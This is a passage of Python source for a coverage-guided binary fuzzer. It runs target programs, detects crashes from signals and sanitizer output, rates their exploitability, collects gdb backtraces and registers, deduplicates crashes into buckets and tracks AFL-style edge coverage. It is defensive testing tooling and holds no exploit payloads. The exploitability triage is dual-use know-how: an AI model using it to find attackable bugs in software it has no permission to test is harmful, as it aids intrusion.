        target_path: Path to target binary (required for QEMU backend)
        qemu_architecture: Target architecture for QEMU (auto-detected if not provided)

    Returns:
        CoverageProvider instance or None
    """
    if backend == CoverageBackend.NONE:
        return None

    # Try AFL shared memory first (for instrumented binaries)
    if backend in (CoverageBackend.AUTO, CoverageBackend.AFL_SHM):
        provider = AflSharedMemoryCoverage(map_size=map_size)
        if provider.is_available():
            return provider
        if backend == CoverageBackend.AFL_SHM:
            return None

    # Try QEMU coverage (for binary-only targets)
    if backend in (CoverageBackend.AUTO, CoverageBackend.QEMU):
        if target_path:
            try:
                from .qemu_coverage_service import QemuCoverageProvider, QemuCoverageConfig
                config = QemuCoverageConfig(
                    target_path=target_path,
                    architecture=qemu_architecture,
                    map_size=map_size,
                )
                provider = QemuCoverageProvider(config)
                if provider.is_available():
                    return provider
                provider.close()
            except ImportError:
                pass
        if backend == CoverageBackend.QEMU:
            return None

    return None

class ProcessHarness:
    """
    Process execution harness for running target binaries.
    
    Features:
    - Spawn and monitor processes
    - Timeout handling
    - Crash detection via exit codes and signals
    - Output capture
    - Resource limits
    """
    
    def __init__(
        self,
        target_path: str,
        args_template: str = "@@",  # @@ replaced with input file path
        timeout_ms: int = 5000,
        memory_limit_mb: int = 1024,
        working_dir: Optional[str] = None,
        environment: Optional[Dict[str, str]] = None,
        use_stdin: Optional[bool] = None,
        coverage_provider: Optional[CoverageProvider] = None,
    ):
        self.target_path = target_path
        self.args_template = args_template
        self.timeout_ms = timeout_ms
        self.memory_limit_mb = memory_limit_mb
        self.working_dir = working_dir or os.path.dirname(target_path)
        self.environment = environment or {}
        self.use_stdin = use_stdin if use_stdin is not None else "@@" not in args_template
        self.coverage_provider = coverage_provider
        
        # Stats
        self.total_executions = 0
        self.total_crashes = 0
        self.total_timeouts = 0
        self.total_time_ms = 0.0
        
        # Temp directory for input files
        self.temp_dir = tempfile.mkdtemp(prefix="binary_fuzzer_")
        
        # Windows-specific crash exit codes
        self.crash_exit_codes = {
            0xC0000005: CrashType.ACCESS_VIOLATION_READ,  # ACCESS_VIOLATION
            0xC0000409: CrashType.STACK_BUFFER_OVERFLOW,  # STATUS_STACK_BUFFER_OVERRUN
            0xC0000374: CrashType.HEAP_CORRUPTION,  # STATUS_HEAP_CORRUPTION
            0xC0000017: CrashType.STACK_EXHAUSTION,  # STATUS_NO_MEMORY
            0xC00000FD: CrashType.STACK_EXHAUSTION,  # STATUS_STACK_OVERFLOW
            0xC0000094: CrashType.DIVIDE_BY_ZERO,  # STATUS_INTEGER_DIVIDE_BY_ZERO
            0xC0000095: CrashType.INTEGER_OVERFLOW,  # STATUS_INTEGER_OVERFLOW
            0x80000003: CrashType.ASSERTION_FAILURE,  # STATUS_BREAKPOINT
            0xC000001D: CrashType.ACCESS_VIOLATION_EXECUTE,  # STATUS_ILLEGAL_INSTRUCTION
        }
        
        # Linux signals
        self.crash_signals = {
            signal.SIGSEGV: CrashType.ACCESS_VIOLATION_READ,
            signal.SIGBUS: CrashType.ACCESS_VIOLATION_READ,
            signal.SIGFPE: CrashType.DIVIDE_BY_ZERO,
            signal.SIGABRT: CrashType.ASSERTION_FAILURE,
            signal.SIGILL: CrashType.ACCESS_VIOLATION_EXECUTE,
        }
    
    def _prepare_input_file(self, data: bytes) -> str:
        """Write input data to a temporary file."""
        input_hash = hashlib.sha256(data).hexdigest()[:16]
        input_path = os.path.join(self.temp_dir, f"input_{input_hash}")
        
        with open(input_path, "wb") as f:
            f.write(data)
        
        return input_path
    
    def _build_command(self, input_path: Optional[str]) -> List[str]:
        """Build the command line with input file path."""
        args_template = self.args_template
        if input_path and "@@" in args_template:
            args_template = args_template.replace("@@", input_path)
        if not args_template:
            return [self.target_path]
        args = shlex.split(args_template, posix=os.name != "nt")
        return [self.target_path] + args
    
    def _classify_crash(self, exit_code: int) -> Tuple[bool, Optional[CrashType]]:
        """Classify if exit code indicates a crash."""
        if os.name == "nt":
            # Windows: negative exit codes or specific exception codes
            if exit_code < 0:
                unsigned_code = exit_code & 0xFFFFFFFF
                crash_type = self.crash_exit_codes.get(unsigned_code, CrashType.UNKNOWN)
                return True, crash_type
        else:
            # Unix: signals are negative exit codes
            if exit_code < 0:
                sig = -exit_code
                crash_type = self.crash_signals.get(sig, CrashType.UNKNOWN)
                return True, crash_type
        
        return False, None
    
    async def execute(self, input_data: bytes) -> ExecutionResult:
        """
        Execute target with the given input.
        
        Args:
            input_data: Input bytes to feed to the target
            
        Returns:
            ExecutionResult with execution details
        """
        self.total_executions += 1
        
        input_path = self._prepare_input_file(input_data) if "@@" in self.args_template else None
        input_hash = hashlib.sha256(input_data).hexdigest()
        command = self._build_command(input_path)
        
        result = ExecutionResult(
            input_file=input_path,
            input_hash=input_hash,
        )
        
        start_time = time.time()
        
        try:
            # Prepare environment
            env = os.environ.copy()
            env.update(self.environment)
            if self.coverage_provider and self.coverage_provider.is_available():
                try:
                    self.coverage_provider.reset()
                    env = self.coverage_provider.prepare_environment(env)
                except Exception:
                    pass
            
            # Enable crash dumps on Windows
            if os.name == "nt":
                env["ASAN_OPTIONS"] = "detect_leaks=0:symbolize=1:abort_on_error=1"
                env["UBSAN_OPTIONS"] = "print_stacktrace=1"
            
            preexec_fn = None
            if resource and os.name != "nt":
                def _set_limits():
                    try:
                        mem_bytes = self.memory_limit_mb * 1024 * 1024
                        resource.setrlimit(resource.RLIMIT_AS, (mem_bytes, mem_bytes))
                    except Exception:
                        pass
                preexec_fn = _set_limits

            # Start process
            process = await asyncio.create_subprocess_exec(
                *command,
                stdin=asyncio.subprocess.PIPE if self.use_stdin else None,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                cwd=self.working_dir,
                env=env,
                preexec_fn=preexec_fn,
            )
            
            try:
                # Wait with timeout
                stdout, stderr = await asyncio.wait_for(
                    process.communicate(input_data if self.use_stdin else None),
                    timeout=self.timeout_ms / 1000.0
                )
                
                result.exit_code = process.returncode
                result.stdout = stdout
                result.stderr = stderr
                
                # Check for crash
                crashed, crash_type = self._classify_crash(process.returncode)
                if crashed:
                    result.crashed = True
                    result.crash_type = crash_type
                    self.total_crashes += 1
                    
                    # Try to extract crash info from stderr
                    self._parse_crash_output(result)
                
            except asyncio.TimeoutError:
                result.timed_out = True
                self.total_timeouts += 1
                
                # Kill the process
                try:
                    process.kill()
                    await process.wait()
                except:
                    pass
        
        except FileNotFoundError:
            result.stderr = f"Target not found: {self.target_path}".encode()
            result.exit_code = -1
        
        except Exception as e:
            result.stderr = str(e).encode()
            result.exit_code = -1
        
        finally:
            result.duration_ms = (time.time() - start_time) * 1000
            self.total_time_ms += result.duration_ms
            if self.coverage_provider and self.coverage_provider.is_available():
                try:
                    result.coverage_data = self.coverage_provider.read_coverage()
                except Exception:
                    pass
        
        return result
    
    def _parse_crash_output(self, result: ExecutionResult):
        """Parse crash details from stderr (ASAN, etc.)."""
        stderr_text = result.stderr.decode("utf-8", errors="replace")
        
        # Look for ASAN output
        if "AddressSanitizer" in stderr_text:
            if "heap-use-after-free" in stderr_text:
                result.crash_type = CrashType.USE_AFTER_FREE
            elif "heap-buffer-overflow" in stderr_text:
                result.crash_type = CrashType.HEAP_CORRUPTION
            elif "stack-buffer-overflow" in stderr_text:
                result.crash_type = CrashType.STACK_BUFFER_OVERFLOW
            elif "double-free" in stderr_text:
                result.crash_type = CrashType.DOUBLE_FREE
            
            # Extract stack trace
            lines = stderr_text.split("\n")
            in_stack = False
            for line in lines:
                if line.strip().startswith("#"):
                    in_stack = True
                    result.stack_trace.append(line.strip())
                elif in_stack and not line.strip():
                    break
        
        # Look for Windows crash info
        if "Exception" in stderr_text:
            # Try to extract exception address
            import re
            addr_match = re.search(r"at address (0x[0-9a-fA-F]+)", stderr_text)
            if addr_match:
                result.exception_address = int(addr_match.group(1), 16)
    
    def execute_sync(self, input_data: bytes) -> ExecutionResult:
        """Synchronous execution wrapper."""
        return asyncio.run(self.execute(input_data))
    
    def cleanup(self):
        """Clean up temporary files."""
        try:
            shutil.rmtree(self.temp_dir, ignore_errors=True)
        except:
            pass
    
    def get_stats(self) -> Dict[str, Any]:
        """Get execution statistics."""
        return {
            "total_executions": self.total_executions,
            "total_crashes": self.total_crashes,
            "total_timeouts": self.total_timeouts,
            "crash_rate": self.total_crashes / max(1, self.total_executions),
            "timeout_rate": self.total_timeouts / max(1, self.total_executions),
            "avg_execution_ms": self.total_time_ms / max(1, self.total_executions),
            "total_time_seconds": self.total_time_ms / 1000,
        }


class SanitizerReplay:
    """Re-run crashing inputs against a sanitizer-instrumented binary."""

    def __init__(
        self,
        target_path: str,
        target_args: str = "@@",
        timeout_ms: int = 5000,
        use_stdin: Optional[bool] = None,
        max_runs: int = 10,
        environment: Optional[Dict[str, str]] = None,
    ):
        self.target_path = target_path
        self.target_args = target_args
        self.timeout_ms = timeout_ms
        self.use_stdin = use_stdin
        self.max_runs = max(0, max_runs)
        self._runs = 0
        self._lock = asyncio.Lock()

        base_env = {
            "ASAN_OPTIONS": "abort_on_error=1:detect_leaks=0:symbolize=1:allocator_may_return_null=1",
            "UBSAN_OPTIONS": "print_stacktrace=1",
            "MSAN_OPTIONS": "halt_on_error=1:symbolize=1",
        }
        if environment:
            base_env.update(environment)

        self._harness = ProcessHarness(
            target_path=target_path,
            args_template=target_args,
            timeout_ms=timeout_ms,
            use_stdin=use_stdin,
            environment=base_env,
        )

    async def replay(self, input_data: bytes) -> Optional[ExecutionResult]:
        """Run the sanitizer binary with the crashing input."""
        async with self._lock:
            if self._runs >= self.max_runs:
                return None
            self._runs += 1
            return await self._harness.execute(input_data)

    def get_runs(self) -> int:
        return self._runs

    def cleanup(self):
        self._harness.cleanup()


# =============================================================================
# CRASH CAPTURE & ANALYSIS (3a, 3c)
# =============================================================================

@dataclass
class CrashInfo:
    """Detailed crash information."""
    id: str = field(default_factory=lambda: str(uuid.uuid4())[:12])
    crash_type: CrashType = CrashType.UNKNOWN
    severity: CrashSeverity = CrashSeverity.UNKNOWN
    exception_code: int = 0
    exception_address: int = 0
    faulting_instruction: str = ""
    faulting_module: str = ""
    stack_trace: List[str] = field(default_factory=list)
    registers: Dict[str, int] = field(default_factory=dict)
    memory_state: Dict[str, Any] = field(default_factory=dict)
    input_hash: str = ""
    input_path: str = ""
    input_size: int = 0
    minidump_path: Optional[str] = None
    timestamp: str = field(default_factory=lambda: datetime.utcnow().isoformat())
    notes: str = ""
    
    def to_dict(self) -> Dict[str, Any]:
        result = asdict(self)
        result["crash_type"] = self.crash_type.value
        result["severity"] = self.severity.value
        return result


class CrashAnalyzer:
    """
    Crash analysis and exploitability classification.
    
    Analyzes crashes to determine:
    - Crash type (buffer overflow, use-after-free, etc.)
    - Severity/exploitability rating
    - Root cause indicators
    """
    
    # Exploitability rules
    EXPLOITABLE_PATTERNS = [
        (CrashType.STACK_BUFFER_OVERFLOW, CrashSeverity.EXPLOITABLE),
        (CrashType.HEAP_CORRUPTION, CrashSeverity.PROBABLY_EXPLOITABLE),
        (CrashType.USE_AFTER_FREE, CrashSeverity.PROBABLY_EXPLOITABLE),
        (CrashType.DOUBLE_FREE, CrashSeverity.PROBABLY_EXPLOITABLE),
        (CrashType.ACCESS_VIOLATION_WRITE, CrashSeverity.PROBABLY_EXPLOITABLE),
        (CrashType.ACCESS_VIOLATION_EXECUTE, CrashSeverity.EXPLOITABLE),
        (CrashType.INTEGER_OVERFLOW, CrashSeverity.PROBABLY_EXPLOITABLE),
    ]
    
    NOT_EXPLOITABLE_PATTERNS = [
        (CrashType.NULL_POINTER, CrashSeverity.PROBABLY_NOT_EXPLOITABLE),
        (CrashType.DIVIDE_BY_ZERO, CrashSeverity.NOT_EXPLOITABLE),
        (CrashType.ASSERTION_FAILURE, CrashSeverity.NOT_EXPLOITABLE),
        (CrashType.STACK_EXHAUSTION, CrashSeverity.NOT_EXPLOITABLE),
        (CrashType.TIMEOUT, CrashSeverity.NOT_EXPLOITABLE),
    ]
    
    def __init__(
        self,
        minidump_dir: Optional[str] = None,
        target_path: Optional[str] = None,
        target_args: str = "@@",
        use_stdin: Optional[bool] = None,
        enable_debugger: bool = True,
        debugger_timeout: float = 5.0,
        max_debug_runs: int = 10,
    ):
        self.minidump_dir = minidump_dir or tempfile.mkdtemp(prefix="minidumps_")
        os.makedirs(self.minidump_dir, exist_ok=True)
        self.target_path = target_path
        self.target_args = target_args or "@@"
        self.use_stdin = use_stdin
        self.enable_debugger = enable_debugger
        self.debugger_timeout = debugger_timeout
        self.max_debug_runs = max_debug_runs
        self._debug_runs = 0
    
    def analyze(self, execution_result: ExecutionResult, input_data: bytes) -> CrashInfo:
        """
        Analyze a crash and produce detailed crash info.
        
        Args:
            execution_result: Result from ProcessHarness
            input_data: The input that caused the crash
            
        Returns:
            CrashInfo with analysis results
        """
        crash_info = CrashInfo(
            crash_type=execution_result.crash_type or CrashType.UNKNOWN,
            exception_code=execution_result.exception_code or (
                execution_result.exit_code if execution_result.exit_code else 0
            ),
            exception_address=execution_result.exception_address or 0,
            stack_trace=execution_result.stack_trace,
            input_hash=hashlib.sha256(input_data).hexdigest(),
            input_size=len(input_data),
        )
        
        # Save input that caused crash
        crash_input_path = os.path.join(
            self.minidump_dir, 
            f"crash_input_{crash_info.id}"
        )
        with open(crash_input_path, "wb") as f:
            f.write(input_data)
        crash_info.input_path = crash_input_path
        
        # Classify exploitability
        crash_info.severity = self._classify_exploitability(crash_info)
        
        # Additional analysis based on crash type
        self._analyze_crash_details(crash_info, execution_result)

        # Collect debugger info when sanitizer output is missing
        if self.enable_debugger and (not crash_info.stack_trace or crash_info.exception_address == 0):
            self._collect_debugger_info(crash_info)
        
        return crash_info
    
    def _classify_exploitability(self, crash_info: CrashInfo) -> CrashSeverity:
        """Classify the exploitability of a crash."""
        crash_type = crash_info.crash_type
        
        # Check exploitable patterns
        for pattern_type, severity in self.EXPLOITABLE_PATTERNS:
            if crash_type == pattern_type:
                return severity
        
        # Check not exploitable patterns
        for pattern_type, severity in self.NOT_EXPLOITABLE_PATTERNS:
            if crash_type == pattern_type:
                return severity
        
        # Additional heuristics for ACCESS_VIOLATION_READ
        if crash_type == CrashType.ACCESS_VIOLATION_READ:
            addr = crash_info.exception_address
            
            # Near-NULL dereference is usually not exploitable
            if addr < 0x10000:
                return CrashSeverity.PROBABLY_NOT_EXPLOITABLE
            
            # Very high addresses might indicate stack issues
            if addr > 0x7FFF0000:
                return CrashSeverity.PROBABLY_EXPLOITABLE
            
            return CrashSeverity.UNKNOWN
        
        return CrashSeverity.UNKNOWN
    
    def _analyze_crash_details(self, crash_info: CrashInfo, result: ExecutionResult):
        """Perform detailed crash analysis."""
        stderr = result.stderr.decode("utf-8", errors="replace")
        
        # Look for patterns in crash output
        if "stack smashing detected" in stderr.lower():
            crash_info.crash_type = CrashType.STACK_BUFFER_OVERFLOW
            crash_info.severity = CrashSeverity.EXPLOITABLE
            crash_info.notes += "Stack canary triggered. "
        
        if "corrupted" in stderr.lower() and "heap" in stderr.lower():
            crash_info.crash_type = CrashType.HEAP_CORRUPTION
            crash_info.severity = CrashSeverity.PROBABLY_EXPLOITABLE
            crash_info.notes += "Heap metadata corruption detected. "
        
        if "double free" in stderr.lower():
            crash_info.crash_type = CrashType.DOUBLE_FREE
            crash_info.severity = CrashSeverity.PROBABLY_EXPLOITABLE
            crash_info.notes += "Double free detected. "
        
        # Extract faulting module from stack trace if possible
        if crash_info.stack_trace:
            first_frame = crash_info.stack_trace[0]
            # Try to extract module name
            if " in " in first_frame:
                parts = first_frame.split(" in ")
                if len(parts) > 1:
                    crash_info.faulting_module = parts[1].split()[0]

    def _collect_debugger_info(self, crash_info: CrashInfo):
        """Attempt to collect stack trace and registers via debugger."""
        if os.name == "nt":
            return
        if not self.target_path or not os.path.isfile(self.target_path):
            return
        if not crash_info.input_path or not os.path.isfile(crash_info.input_path):
            return
        if self._debug_runs >= self.max_debug_runs:
            return
        if not shutil.which("gdb"):
            return
        
        self._debug_runs += 1
        
        args: List[str] = []
        run_cmd = "run"
        if self.target_args:
            if "@@" in self.target_args:
                args = shlex.split(
                    self.target_args.replace("@@", crash_info.input_path),
                    posix=os.name != "nt",
                )
            else:
                args = shlex.split(self.target_args, posix=os.name != "nt")
                if self.use_stdin:
                    run_cmd = f"run < {crash_info.input_path}"
        elif self.use_stdin:
            run_cmd = f"run < {crash_info.input_path}"
        
        gdb_cmds = [
            "set pagination off",
            "set confirm off",
            run_cmd,
            "bt",
            "info registers",
            "x/i $pc",
        ]
        
        cmd = ["gdb", "--batch", "--quiet"]
        for gdb_cmd in gdb_cmds:
            cmd.extend(["-ex", gdb_cmd])
        cmd.extend(["--args", self.target_path])
        cmd.extend(args)
        
        try:
            proc = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=self.debugger_timeout,
            )
        except Exception:
            return
        
        output = "\n".join([proc.stdout or "", proc.stderr or ""])
        if not output.strip():
            return
        
        stack_trace = []
        registers: Dict[str, int] = {}
        faulting_instruction = ""
        for line in output.splitlines():
            stripped = line.strip()
            if stripped.startswith("#"):
                stack_trace.append(stripped)
            if stripped.startswith("=>"):
                faulting_instruction = stripped
            parts = stripped.split()
            if len(parts) >= 2 and re.match(r"^[a-zA-Z][a-zA-Z0-9]*$", parts[0]):
                reg_name = parts[0].lower()
                if parts[1].startswith("0x"):
                    try:
                        registers[reg_name] = int(parts[1], 16)
                    except ValueError:
                        pass
        
        if stack_trace:
            crash_info.stack_trace = stack_trace
        if registers:
            crash_info.registers.update(registers)
            for reg in ("rip", "eip", "pc"):
                if reg in registers and crash_info.exception_address == 0:
                    crash_info.exception_address = registers[reg]
                    break
        if faulting_instruction:
            crash_info.faulting_instruction = faulting_instruction


# =============================================================================
# CRASH DATABASE (3e)
# =============================================================================

@dataclass
class CrashBucket:
    """A bucket of similar crashes (deduplicated)."""
    id: str
    crash_type: CrashType
    severity: CrashSeverity
    stack_hash: str
    sample_count: int = 1
    first_seen: str = ""
    last_seen: str = ""
    sample_crashes: List[str] = field(default_factory=list)  # List of crash IDs
    sample_inputs: List[str] = field(default_factory=list)  # Paths to sample inputs
    notes: str = ""
    
    def to_dict(self) -> Dict[str, Any]:
        result = asdict(self)
        result["crash_type"] = self.crash_type.value
        result["severity"] = self.severity.value
        return result


class CrashDatabase:
    """
    Database for storing and managing crashes.
    
    Features:
    - Crash storage and retrieval
    - Deduplication via stack hashing
    - Severity-based sorting
    - Export capabilities
    """
    
    def __init__(self, db_path: Optional[str] = None):
        self.db_path = db_path or tempfile.mkdtemp(prefix="crash_db_")
        os.makedirs(self.db_path, exist_ok=True)
        
        self.crashes: Dict[str, CrashInfo] = {}
        self.buckets: Dict[str, CrashBucket] = {}
        
        # Load existing crashes if db exists
        self._load_database()
    
    def _load_database(self):
        """Load crashes from disk."""
        crashes_file = os.path.join(self.db_path, "crashes.json")
        buckets_file = os.path.join(self.db_path, "buckets.json")
        
        if os.path.exists(crashes_file):
            try:
                with open(crashes_file, "r") as f:
                    data = json.load(f)
                    for crash_data in data:
                        crash = CrashInfo(**crash_data)
                        crash.crash_type = CrashType(crash_data["crash_type"])
                        crash.severity = CrashSeverity(crash_data["severity"])
                        self.crashes[crash.id] = crash
            except Exception as e:
                logger.warning(f"Failed to load crashes: {e}")
        
        if os.path.exists(buckets_file):
            try:
                with open(buckets_file, "r") as f:
                    data = json.load(f)
                    for bucket_data in data:
                        bucket = CrashBucket(**bucket_data)
                        bucket.crash_type = CrashType(bucket_data["crash_type"])
                        bucket.severity = CrashSeverity(bucket_data["severity"])
                        self.buckets[bucket.id] = bucket
            except Exception as e:
                logger.warning(f"Failed to load buckets: {e}")
    
    def _save_database(self):
        """Save crashes to disk."""
        crashes_file = os.path.join(self.db_path, "crashes.json")
        buckets_file = os.path.join(self.db_path, "buckets.json")
        
        with open(crashes_file, "w") as f:
            json.dump([c.to_dict() for c in self.crashes.values()], f, indent=2)
        
        with open(buckets_file, "w") as f:
            json.dump([b.to_dict() for b in self.buckets.values()], f, indent=2)
    
    def _compute_stack_hash(self, crash: CrashInfo) -> str:
        """Compute hash for deduplication based on stack trace."""
        # Use first 5 frames for hashing
        frames = crash.stack_trace[:5] if crash.stack_trace else []
        
        key_parts = [crash.crash_type.value, str(crash.exception_code)]
        if crash.faulting_module:
            key_parts.append(crash.faulting_module)
        
        if frames:
            key_parts.append("|".join(frames))
        else:
            if crash.exception_address:
                key_parts.append(hex(crash.exception_address))
            else:
                if crash.input_hash:
                    key_parts.append(crash.input_hash[:8])
                if crash.input_size:
                    key_parts.append(str(crash.input_size))
        
        key_data = ":".join(key_parts)
        return hashlib.sha256(key_data.encode()).hexdigest()[:16]
    
    def add_crash(self, crash: CrashInfo) -> Tuple[bool, str]:
        """
        Add a crash to the database.
        
        Returns:
            Tuple of (is_new, bucket_id)
        """
        stack_hash = self._compute_stack_hash(crash)
        
        # Store the crash
        self.crashes[crash.id] = crash
        
        # Check for existing bucket
        bucket_id = None
        is_new = True
        
        for bid, bucket in self.buckets.items():
            if bucket.stack_hash == stack_hash:
                # Existing bucket
                bucket.sample_count += 1
                bucket.last_seen = crash.timestamp
                bucket.sample_crashes.append(crash.id)
                if len(bucket.sample_inputs) < 5:  # Keep up to 5 sample inputs
                    bucket.sample_inputs.append(crash.input_path)
                
                # Update severity if this crash is more severe
                if self._severity_rank(crash.severity) > self._severity_rank(bucket.severity):
                    bucket.severity = crash.severity
                
                bucket_id = bucket.id
                is_new = False
                break
        
        if is_new:
            # Create new bucket
            bucket = CrashBucket(
                id=f"bucket_{len(self.buckets)+1:04d}",
                crash_type=crash.crash_type,
                severity=crash.severity,
                stack_hash=stack_hash,
                first_seen=crash.timestamp,
                last_seen=crash.timestamp,
                sample_crashes=[crash.id],
                sample_inputs=[crash.input_path] if crash.input_path else [],
            )
            self.buckets[bucket.id] = bucket
            bucket_id = bucket.id
        
        # Save to disk
        self._save_database()
        
        return is_new, bucket_id
    
    def _severity_rank(self, severity: CrashSeverity) -> int:
        """Get numeric rank for severity comparison."""
        ranks = {
            CrashSeverity.EXPLOITABLE: 4,
            CrashSeverity.PROBABLY_EXPLOITABLE: 3,
            CrashSeverity.UNKNOWN: 2,
            CrashSeverity.PROBABLY_NOT_EXPLOITABLE: 1,
            CrashSeverity.NOT_EXPLOITABLE: 0,
        }
        return ranks.get(severity, 2)
    
    def get_crash(self, crash_id: str) -> Optional[CrashInfo]:
        """Get a specific crash by ID."""
        return self.crashes.get(crash_id)
    
    def get_bucket(self, bucket_id: str) -> Optional[CrashBucket]:
        """Get a specific bucket by ID."""
        return self.buckets.get(bucket_id)
    
    def get_all_buckets(self, sort_by_severity: bool = True) -> List[CrashBucket]:
        """Get all crash buckets, optionally sorted by severity."""
        buckets = list(self.buckets.values())
        
        if sort_by_severity:
            buckets.sort(key=lambda b: self._severity_rank(b.severity), reverse=True)
        
        return buckets
    
    def get_stats(self) -> Dict[str, Any]:
        """Get database statistics."""
        severity_counts = {}
        type_counts = {}
        
        for bucket in self.buckets.values():
            sev = bucket.severity.value
            typ = bucket.crash_type.value
            severity_counts[sev] = severity_counts.get(sev, 0) + 1
            type_counts[typ] = type_counts.get(typ, 0) + 1
        
        return {
            "total_crashes": len(self.crashes),
            "unique_buckets": len(self.buckets),
            "severity_distribution": severity_counts,
            "type_distribution": type_counts,
            "db_path": self.db_path,
        }
    
    def export_bucket(self, bucket_id: str, export_dir: str) -> bool:
        """Export a bucket with all its sample inputs."""
        bucket = self.buckets.get(bucket_id)
        if not bucket:
            return False
        
        bucket_dir = os.path.join(export_dir, bucket_id)
        os.makedirs(bucket_dir, exist_ok=True)
        
        # Export bucket info
        with open(os.path.join(bucket_dir, "info.json"), "w") as f:
            json.dump(bucket.to_dict(), f, indent=2)
        
        # Copy sample inputs
        for i, input_path in enumerate(bucket.sample_inputs):
            if os.path.exists(input_path):
                dest = os.path.join(bucket_dir, f"input_{i}")
                shutil.copy2(input_path, dest)
        
        return True


# =============================================================================
# COVERAGE COLLECTION (1c) - Phase 2
# =============================================================================

@dataclass
class CoverageInfo:
    """Coverage information for an execution."""
    edge_count: int = 0
    block_count: int = 0
    new_edges: int = 0
    new_blocks: int = 0
    edge_bitmap: bytes = b""
    hit_counts: Dict[int, int] = field(default_factory=dict)
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "edge_count": self.edge_count,
            "block_count": self.block_count,
            "new_edges": self.new_edges,
            "new_blocks": self.new_blocks,
            "bitmap_size": len(self.edge_bitmap),
        }


class CoverageTracker:
    """
    Tracks code coverage across fuzzing iterations.
    
    Uses a bitmap-based approach similar to AFL:
    - Each edge (src_block -> dst_block) is hashed to a bitmap index
    - Hit counts are bucketed (1, 2, 3, 4-7, 8-15, 16-31, 32-127, 128+)
    - New coverage is detected when new edges or new hit count buckets appear
    """
    
    # Hit count buckets (AFL-style)
    HIT_COUNT_BUCKETS = [1, 2, 3, 4, 8, 16, 32, 128]
    
    def __init__(self, bitmap_size: int = 65536):
        self.bitmap_size = bitmap_size
        self.global_bitmap = bytearray(bitmap_size)
        self.virgin_bits = bytearray([0xFF] * bitmap_size)  # Track never-hit edges
        
        # Statistics
        self.total_edges_discovered = 0
        self.total_blocks_discovered = 0
        self.coverage_history: List[Tuple[int, int]] = []  # (iteration, edges)
        
        # Edge tracking
        self.known_edges: Set[int] = set()
        self.edge_hit_counts: Dict[int, int] = {}
    
    @staticmethod
    def _bucket_hit_count(count: int) -> int:
        """Convert hit count to bucket index (AFL-style)."""
        if count == 0:
            return 0
        elif count == 1:
            return 1
        elif count == 2:
            return 2
        elif count == 3:
            return 4
        elif count <= 7:
            return 8
        elif count <= 15:
            return 16
        elif count <= 31:
            return 32
        elif count <= 127:
            return 64
        else:
            return 128
    
    def process_coverage(self, trace_bitmap: bytes) -> CoverageInfo:
        """
        Process coverage bitmap from an execution.
        
        Args:
            trace_bitmap: Raw coverage bitmap from execution
            
        Returns:
            CoverageInfo with coverage statistics
        """
        if not trace_bitmap:
            return CoverageInfo()
        
        # Ensure bitmap is the right size
        if len(trace_bitmap) < self.bitmap_size:
            trace_bitmap = trace_bitmap + bytes(self.bitmap_size - len(trace_bitmap))
        elif len(trace_bitmap) > self.bitmap_size:
            trace_bitmap = trace_bitmap[:self.bitmap_size]
        
        new_edges = 0
        new_blocks = 0
        edge_count = 0
        block_count = 0
        hit_counts = {}
        
        for i, hit in enumerate(trace_bitmap):
            if hit == 0:
                continue
            
            edge_count += 1
            bucketed = self._bucket_hit_count(hit)
            
            # Check if this is a new edge
            if i not in self.known_edges:
                self.known_edges.add(i)
                new_edges += 1
                self.total_edges_discovered += 1
            
            # Check for new hit count bucket
            if self.virgin_bits[i] & bucketed:
                self.virgin_bits[i] &= ~bucketed
                new_blocks += 1
            
            # Update global bitmap
            self.global_bitmap[i] |= bucketed
            
            # Track hit counts
            self.edge_hit_counts[i] = self.edge_hit_counts.get(i, 0) + hit
            hit_counts[i] = hit
        
        return CoverageInfo(
            edge_count=edge_count,
            block_count=edge_count,  # Simplified
            new_edges=new_edges,
            new_blocks=new_blocks,
            edge_bitmap=bytes(trace_bitmap),
            hit_counts=hit_counts,
        )
    
    def has_new_coverage(self, trace_bitmap: bytes) -> bool:
        """Quick check if trace has any new coverage."""
        if not trace_bitmap:
            return False
        
        for i, hit in enumerate(trace_bitmap[:self.bitmap_size]):
            if hit == 0:
                continue
            if i not in self.known_edges:
                return True
            bucketed = self._bucket_hit_count(hit)
            if self.virgin_bits[i] & bucketed:
                return True
        
        return False
    
    def get_coverage_percentage(self) -> float:
        """Calculate approximate coverage percentage."""
        if self.bitmap_size == 0:
            return 0.0
        return (len(self.known_edges) / self.bitmap_size) * 100
    
    def get_stats(self) -> Dict[str, Any]:
        """Get coverage statistics."""
        return {
            "total_edges_discovered": self.total_edges_discovered,
            "known_edges": len(self.known_edges),
            "bitmap_size": self.bitmap_size,
            "coverage_percentage": self.get_coverage_percentage(),
            "bitmap_density": sum(1 for b in self.global_bitmap if b > 0) / self.bitmap_size,
        }
    
    def save_state(self, path: str):
        """Save coverage state to disk."""
        state = {
            "bitmap_size": self.bitmap_size,
            "global_bitmap": base64.b64encode(self.global_bitmap).decode(),
            "virgin_bits": base64.b64encode(self.virgin_bits).decode(),
            "known_edges": list(self.known_edges),
            "total_edges_discovered": self.total_edges_discovered,
        }
        with open(path, "w") as f:
            json.dump(state, f)
    
    def load_state(self, path: str):
        """Load coverage state from disk."""
        if not os.path.exists(path):
            return
        try:
            with open(path, "r") as f:
                state = json.load(f)
            self.bitmap_size = state["bitmap_size"]
            self.global_bitmap = bytearray(base64.b64decode(state["global_bitmap"]))
            self.virgin_bits = bytearray(base64.b64decode(state["virgin_bits"]))
            self.known_edges = set(state["known_edges"])
            self.total_edges_discovered = state["total_edges_discovered"]
        except Exception as e:
            logger.warning(f"Failed to load coverage state: {e}")


# =============================================================================
# CORPUS MANAGEMENT (1d) - Phase 2
# =============================================================================

@dataclass
class CorpusEntry:
    """An entry in the fuzzing corpus."""
    id: str = field(default_factory=lambda: str(uuid.uuid4())[:12])
    data: bytes = b""
    size: int = 0
    hash: str = ""
    filename: Optional[str] = None
    
    # Coverage info
    edges_hit: int = 0
    new_edges: int = 0
    edge_bitmap_hash: str = ""
    edge_ids_sample: List[int] = field(default_factory=list)
    
    # Scheduling info
    favored: bool = False
    handicap: int = 0
    depth: int = 0
    exec_count: int = 0
    last_exec_time: float = 0.0
    avg_exec_ms: float = 0.0
    last_exec_ms: float = 0.0
    found_crashes: int = 0
    
    # Metadata
    parent_id: Optional[str] = None
    mutation_type: Optional[str] = None
    added_at: str = field(default_factory=lambda: datetime.utcnow().isoformat())
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "id": self.id,
            "size": self.size,
            "hash": self.hash,
